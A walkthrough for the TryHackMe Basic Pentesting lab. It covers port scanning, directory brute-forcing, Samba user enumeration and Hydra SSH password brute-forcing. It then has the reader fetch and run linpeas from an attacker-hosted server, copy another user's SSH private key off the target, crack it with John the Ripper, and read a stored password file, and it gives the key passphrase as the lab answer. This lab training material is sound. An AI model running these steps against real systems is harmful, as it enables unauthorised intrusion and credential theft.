# TryHackMe Basic Pentesting Walkthrough

## Overview

This repository contains a comprehensive walkthrough for the TryHackMe **Basic Pentesting** room. You will learn how to deploy the machine, enumerate services, brute-force credentials, and perform privilege escalation on a Linux target.

## Prerequisites

* A TryHackMe account and the Basic Pentesting room machine deployed.
* **AttackBox** or **OpenVPN** configured on your local machine.
* The following tools installed:

  * `nmap`
  * `gobuster`
  * `enum4linux`
  * `hydra`
  * `ssh`
  * `linpeas.sh` or `LinEnum`
  * `python3`, `wget`
  * `john` (John the Ripper)
  * `ssh2john`

## Table of Contents

1. [Deploy and Connect](#deploy-and-connect)
2. [Service Enumeration](#service-enumeration)
3. [Hidden Directory Discovery](#hidden-directory-discovery)
4. [Username Enumeration](#username-enumeration)
5. [Password Brute‑forcing](#password-brute-forcing)
6. [Access via SSH](#access-via-ssh)
7. [Privilege Escalation Enumeration](#privilege-escalation-enumeration)
8. [Secondary User Discovery](#secondary-user-discovery)
9. [SSH Key Extraction & Cracking](#ssh-key-extraction--cracking)
10. [Final Password Retrieval](#final-password-retrieval)
11. [Conclusion](#conclusion)

---

## Deploy and Connect

Deploy the Basic Pentesting machine in TryHackMe. Then connect using either the AttackBox or your own machine via OpenVPN:

```bash
# Using OpenVPN:
openvpn --config ~/TryHackMe/BasicPentesting.ovpn
```

## Service Enumeration

Perform a full TCP SYN scan with default scripts and version detection:

```bash
nmap -sS -sC -A -p- -T5 <TARGET_IP> | tee nmap-enum
```

## Hidden Directory Discovery

Use Gobuster to find hidden web directories:

```bash
gobuster dir \
  -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 64 \
  -o gobuster-bruteforce
```

Visiting the discovered directory reveals `/development`.

**Hidden directory**: `development`

## Username Enumeration

Enumerate Windows/Samba information with enum4linux:

```bash
enum4linux -a <TARGET_IP> | tee enum4linux-out
```

Look for valid user accounts in the output.

**Username found**: `jan`

## Password Brute‑forcing

Brute-force SSH credentials for user `jan` using Hydra:

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

**Password obtained**: `<INSERT_JAN_PASSWORD>`

## Access via SSH

Login to the machine using SSH:

```bash
ssh jan@<TARGET_IP>
```

**Service used**: SSH

## Privilege Escalation Enumeration

Transfer and run LinEnum or LinPeas to discover local privilege escalation vectors:

```bash
# On your local machine:
python3 -m http.server --bind <YOUR_TUN0_IP> 8000

# On the target machine:
wget http://<YOUR_TUN0_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Review the scan output for misconfigurations; a key-based escalation vector is identified.

## Secondary User Discovery

LinPeas reveals another user account:

**Secondary user**: `kay`

## SSH Key Extraction & Cracking

Retrieve and crack `kay`’s SSH private key:

```bash
# On the target:
cd /home/kay/.ssh
cat id_rsa > ~/kay_id_rsa

# Back on your machine:
scp jan@<TARGET_IP>:/home/kay/.ssh/id_rsa .
chmod 600 id_rsa

# Convert for John the Ripper:
ssh2john id_rsa > john-pass
john --wordlist=/usr/share/wordlists/rockyou.txt john-pass
```

**Key password**: `beeswax`

Use the cracked key to SSH as kay:

```bash
ssh -i id_rsa kay@<TARGET_IP>
```

## Final Password Retrieval

Read the final password stored in `pass.bak`:

```bash
cat /home/kay/pass.bak
```

**Final password**: `<INSERT_FINAL_PASSWORD>`

## Conclusion

Congratulations! You have successfully completed the TryHackMe Basic Pentesting room, encompassing web app testing, credential brute-forcing, and privilege escalation.

---

> Walkthrough adapted from Atharva’s Medium article: [TryHackMe Walkthrough — Basic Pentesting](https://medium.com/@athu.patil03/tryhackme-walkthrough-basic-pentesting-d0cb52f1fe64)
